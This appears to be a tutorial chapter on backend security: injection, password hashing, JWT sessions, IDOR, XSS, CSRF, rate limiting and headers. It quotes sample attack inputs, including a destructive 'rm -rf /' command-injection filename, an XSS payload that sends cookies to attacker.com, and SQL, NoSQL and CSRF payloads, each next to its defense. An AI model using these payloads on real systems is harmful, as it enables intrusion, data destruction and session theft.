# 20. Backend Security: Everything You Need to Know

## 1. The Core Philosophy of Backend Security

Backend security is not a disconnected checklist of abstract vulnerabilities, nor is it an afterthought to sprinkle on top of a finished application. It is a fundamental engineering discipline that governs system design from day one.

### 1.1 The Root Cause of Vulnerabilities: Context Boundaries
Why do vulnerabilities exist in software?
At its core, a backend application acts as a translator between multiple protocols, languages, and runtime contexts:
- Incoming HTTP requests and headers
- JSON / XML payloads
- SQL / NoSQL database engines
- Operating system shells
- HTML / JavaScript templates rendered for clients

> [!IMPORTANT]
> **The Fundamental Axiom of Security:** Vulnerabilities occur at **context boundaries** when untrusted data originating from one context (e.g., user input from HTTP) is interpreted as executable code or commands in another context (e.g., SQL engine, bash shell, browser DOM).

### 1.2 Defense in Depth (Layered Security)
Never rely on a single defensive barrier. If an attacker bypasses one layer, subsequent layers must prevent exploitation:

```
                            INCOMING ATTACK
                                  │
                                  ▼
             ┌─────────────────────────────────────────┐
             │ Layer 1: Edge & WAF (Cloudflare, AWS)   │ ──▶ Blocks volumetric DDoS, botnets
             └────────────────────┬────────────────────┘
                                  ▼
             ┌─────────────────────────────────────────┐
             │ Layer 2: Network / Reverse Proxy        │ ──▶ Enforces TLS, IP limits, timeouts
             └────────────────────┬────────────────────┘
                                  ▼
             ┌─────────────────────────────────────────┐
             │ Layer 3: Application Validation         │ ──▶ Strict typing, schema bounds
             └────────────────────┬────────────────────┘
                                  ▼
             ┌─────────────────────────────────────────┐
             │ Layer 4: Authentication & Authorization │ ──▶ Identity verification, RBAC/ABAC
             └────────────────────┬────────────────────┘
                                  ▼
             ┌─────────────────────────────────────────┐
             │ Layer 5: Safe Execution & Queries       │ ──▶ Parameterized SQL, zero-eval
             └────────────────────┬────────────────────┘
                                  ▼
             ┌─────────────────────────────────────────┐
             │ Layer 6: Data at Rest (Encryption)      │ ──▶ Salted hashes (bcrypt), KMS
             └─────────────────────────────────────────┘
```

## 2. Injection Attacks: SQL, Command, and NoSQL Injection

Injection occurs when an untrusted input alters the intended syntax and execution tree of an interpreter.

### 2.1 SQL Injection (SQLi)
The most infamous vulnerability in backend history.

#### How It Works:
```sql
-- Vulnerable dynamic string concatenation:
SELECT * FROM users WHERE email = '$user_input' AND status = 'active';

-- If user_input is: admin@test.com' OR '1'='1
-- The resulting SQL becomes:
SELECT * FROM users WHERE email = 'admin@test.com' OR '1'='1' AND status = 'active';
-- The OR condition evaluates to TRUE for every single row, bypassing authentication!
```

#### The Ultimate Solution: Parameterized Queries (Prepared Statements)
Why do parameterized queries work 100% of the time?
1. **Compilation Phase:** The database compiles the SQL query structure into an abstract syntax tree (AST) *before* receiving any user input. The command structure is permanently fixed.
2. **Execution Phase:** User arguments are sent separately as raw data values. Even if the argument contains `' OR '1'='1`, the database treats the entire string literally as an email address value, not executable SQL syntax.

```typescript
// ❌ VULNERABLE: Dynamic String Interpolation
const query = `SELECT * FROM users WHERE id = ${req.params.id}`;

// ✅ SECURE: Parameterized Query
const query = `SELECT * FROM users WHERE id = $1`;
await db.query(query, [req.params.id]);
```

### 2.2 Command Injection (OS Injection)
Occurs when user-supplied data is concatenated into operating system shell calls (e.g., executing ImageMagick, ffmpeg, or PDF converters).

```typescript
// ❌ VULNERABLE: Invokes a system shell (sh/bash)
const filename = req.query.file; // Attacker sends: "report.pdf; rm -rf /"
exec(`convert ${filename} output.png`);

// ✅ SECURE: Use execFile / spawn with separate argument arrays without invoking a shell
execFile('convert', [filename, 'output.png']);
```

### 2.3 NoSQL Injection
Even in document databases like MongoDB, passing raw JSON objects directly into query operators allows attackers to bypass filters:
```json
// Attacker sends JSON body:
{ "username": "admin", "password": { "$gt": "" } }

// If passed directly to db.users.find(req.body), it matches any user whose password > empty string!
// Solution: Enforce strict input validation schemas (Zod) requiring strings, not objects.
```

## 3. Authentication & Password Security

### 3.1 The Breach Reality
Every backend engineer must operate under the assumption that **the database will eventually be compromised** (via server vulnerabilities, backup leaks, or insider threats). Your password architecture determines whether that breach is a minor inconvenience or an existential catastrophe.

### 3.2 Password Hashing Evolution
- **Plain Text / Base64:** Fatal malpractice.
- **MD5 / SHA-1 / Plain SHA-256:** Cryptographically obsolete for passwords. Modern GPUs can calculate over **10 billion SHA-256 hashes per second**, making brute-force and dictionary attacks trivial.
- **Rainbow Tables:** Precomputed lookup tables of billions of hashed common passwords.

### 3.3 The Two Pillars of Secure Password Storage
1. **Cryptographic Salt:** A unique, cryptographically secure random string generated per user and prepended to the password before hashing. Defeats precomputed Rainbow Tables completely because attackers cannot reuse hashes across users.
2. **Work Factors & Adaptive Slow Hashes:** Purpose-built algorithms that consume deliberate CPU cycles and RAM to make brute-forcing computationally prohibitive:

```
┌────────────────────────────────────────────────────────────────────────┐
│                      MODERN PASSWORD HASHING ALGORITHMS                │
├─────────────────┬──────────────────┬───────────────────────────────────┤
│ Algorithm       │ Type             │ Industry Recommendation           │
├─────────────────┼──────────────────┼───────────────────────────────────┤
│ **Argon2id**    │ Memory & CPU Hard│ Winner of Password Hash Comp.     │
│                 │                  │ Gold standard; ASIC/GPU resistant.│
├─────────────────┼──────────────────┼───────────────────────────────────┤
│ **bcrypt**      │ CPU Hard         │ Highly battle-tested, adaptive    │
│                 │ (Work factor)    │ cost factor (recommended cost 12).│
├─────────────────┼──────────────────┼───────────────────────────────────┤
│ **scrypt**      │ Memory Hard      │ Strong against hardware attacks.  │
├─────────────────┼──────────────────┼───────────────────────────────────┤
│ **PBKDF2**      │ Iteration-based  │ NIST compliant, but less memory-  │
│                 │                  │ hard than Argon2 or bcrypt.       │
└─────────────────┴──────────────────┴───────────────────────────────────┘
```

## 4. Session Management: Stateful Sessions vs. Stateless JWTs

```
Stateful Sessions (Redis / DB)              Stateless JWT (Tokens)
┌───────────────────────────────────┐       ┌───────────────────────────────────┐
│ Client holds opaque Session ID    │       │ Client holds cryptographically    │
│ Server stores session in Redis    │       │ signed JSON payload               │
├───────────────────────────────────┤       ├───────────────────────────────────┤
│ ✅ Instant server-side revocation  │       │ ❌ Revocation requires blacklists │
│ ❌ Distributed state storage cost │       │ ✅ Zero database lookup on verify │
│ ✅ Small cookie footprint         │       │ ❌ Large token footprint in header│
└───────────────────────────────────┘       └───────────────────────────────────┘
```

### 4.1 The Great JWT Revocation Dilemma
Because JSON Web Tokens (JWTs) are cryptographically self-contained and stateless, the server verifies them using a secret key without querying a database.
- **The Problem:** If a user’s token is stolen, or if an account is banned, **you cannot revoke a stateless JWT before its expiration date** without re-introducing state (a Redis token blacklist), which defeats the primary purpose of statelessness.
- **Production-Grade Dual-Token Architecture:**
  1. **Short-Lived Access Token:** Expire in 5 to 15 minutes. Used for rapid, stateless API authorization.
  2. **Long-Lived Refresh Token:** Valid for 7 to 30 days. Stored securely in the database/Redis with token rotation. When a refresh token is used, it is invalidated and replaced with a new one. If an account is compromised, revoking the refresh token cuts off access within minutes.

### 4.2 Storage Security: LocalStorage vs. Cookies

| Storage Location | XSS Vulnerability | CSRF Vulnerability | Production Recommendation |
| :--- | :--- | :--- | :--- |
| **LocalStorage** | **100% Vulnerable** (Any malicious script can read all keys) | Immune | ❌ Never store sensitive tokens here. |
| **HttpOnly Cookie**| **Immune** (JavaScript cannot access cookie via DOM) | Vulnerable if unmitigated | ✅ Industry standard for auth tokens. |

**The Three Essential Cookie Security Flags:**
- `HttpOnly`: Prevents client-side JavaScript access (stops XSS token theft).
- `Secure`: Cookie is transmitted exclusively over encrypted HTTPS connections.
- `SameSite=Strict` or `SameSite=Lax`: Prevents browsers from sending the cookie on cross-site requests, mitigating CSRF.

## 5. Authorization & Access Control: Preventing IDOR / BOLA

### 5.1 The #1 API Vulnerability: BOLA / IDOR
**Broken Object Level Authorization (BOLA)**, historically known as **Insecure Direct Object Reference (IDOR)**, consistently ranks as the #1 API threat in OWASP Top 10 API Security.

```
Attacker Request:
GET /api/v1/invoices/9842

Vulnerable Backend Logic:
1. Verify JWT ──▶ User is authenticated as User #501 (Alice)
2. Query: SELECT * FROM invoices WHERE id = 9842
3. Invoice #9842 belongs to User #100 (Bob)!
4. Backend returns Bob's invoice to Alice. 💥 DATA LEAK
```

### 5.2 The Fix: Scope Every Query to the Authenticated Context
Authentication verifies **who you are**; Authorization verifies **what you are allowed to do**.

```typescript
// ✅ SECURE: Always enforce tenant / ownership isolation at the query level
const invoice = await db.query(
  `SELECT * FROM invoices WHERE id = $1 AND organization_id = $2`,
  [invoiceId, req.user.organizationId]
);
if (!invoice) {
  return res.status(404).json({ error: "Invoice not found" }); // Don't leak existence
}
```

### 5.3 RBAC vs. ABAC & The Principle of Default Deny
- **Role-Based Access Control (RBAC):** Users $\rightarrow$ Roles (Admin, Editor, Viewer) $\rightarrow$ Permissions.
- **Attribute-Based Access Control (ABAC):** Granular policies evaluated at runtime based on user attributes, resource attributes, and context (e.g., *"Engineers can edit pull requests only if they are the author AND the branch is not master"*).
- **Default Deny:** Every endpoint must deny access unless an explicit rule permits it.

## 6. Client-Side Vulnerabilities: XSS & CSRF

### 6.1 Cross-Site Scripting (XSS)
Occurs when an attacker injects malicious JavaScript that executes inside victims' browsers.
- **Stored XSS:** Malicious payload is saved to the database (e.g., in a forum comment: `<script>fetch('attacker.com/steal?c='+document.cookie)</script>`) and executed by every user who views the page.
- **Reflected XSS:** Payload is reflected off the server via URL query params or form errors.
- **Backend Defense:**
  - Context-aware output encoding.
  - Strict HTML sanitization on ingestion (e.g., DOMPurify or sanitize-html).
  - Enforce `Content-Security-Policy` (CSP) HTTP headers restricting where scripts can load from.
  - Store tokens in `HttpOnly` cookies so XSS cannot extract session credentials.

### 6.2 Cross-Site Request Forgery (CSRF)
An attack where a malicious site tricks an authenticated user’s browser into submitting unauthorized requests to your backend (e.g., `<img src="https://bank.com/transfer?amount=1000&to=attacker">`).
- **Defenses:**
  - Set `SameSite=Lax` or `SameSite=Strict` on all authentication cookies.
  - Anti-CSRF Synchronizer Tokens (Double Submit Cookie pattern) on mutating requests (POST, PUT, DELETE).
  - Verify `Origin` and `Referer` headers on all state-changing endpoints.

## 7. Rate Limiting & Denial of Service (DoS) Defense

Without rate limiting, any automated script can brute-force passwords, scrape sensitive catalogs, or overwhelm server resources.

```
                           Layered Rate Limiting Strategy
┌────────────────────────────────────────────────────────────────────────┐
│ Edge / CDN (Cloudflare)   │ Volumetric DDoS, IP reputation filtering  │
├───────────────────────────┼────────────────────────────────────────────┤
│ Reverse Proxy (Nginx)     │ Global IP connection rate limits           │
├───────────────────────────┼────────────────────────────────────────────┤
│ Application (Redis Store) │ Per-user token bucket, Per-API-key limits  │
├───────────────────────────┼────────────────────────────────────────────┤
│ Sensitive Endpoints       │ Strict limit (e.g., /login max 5 req/15min)│
└───────────────────────────┴────────────────────────────────────────────┘
```

**Common Algorithms:**
- **Token Bucket / Leaky Bucket:** Smooths bursts while enforcing long-term rates.
- **Sliding Window Log (Redis):** Highly accurate rate limiting using Redis sorted sets (`ZSET`).

## 8. Hardening Headers & Security Misconfigurations

Production backends must deliver standard security response headers:

| Header | Production Configuration | Purpose |
| :--- | :--- | :--- |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | Forces all future browser connections to use HTTPS (HSTS). |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing attacks. |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Mitigates Clickjacking by forbidding iframe embedding. |
| `Content-Security-Policy` | `default-src 'self'; ...` | Restricts sources of scripts, styles, images, and fonts. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Prevents leaking sensitive tokens/IDs in URL referrer headers. |

## 9. Key Takeaways Summary

- **Security failures happen at context boundaries:** Never let raw user data get evaluated as instructions in SQL, shells, or browsers.
- **Always use prepared statements:** They neutralize SQL injection with 100% mathematical certainty.
- **Store passwords using modern adaptive hashes:** Use **Argon2id** or **bcrypt** with unique cryptographic salts; never MD5 or plain SHA.
- **Store authentication tokens in `HttpOnly`, `Secure`, `SameSite` cookies** to protect against XSS token harvesting.
- **Prevent BOLA/IDOR by scoping every single query** to the authenticated user's ID or organizational context.
- **Implement Defense in Depth:** Rely on layered security so that the failure of any single component does not compromise the system.
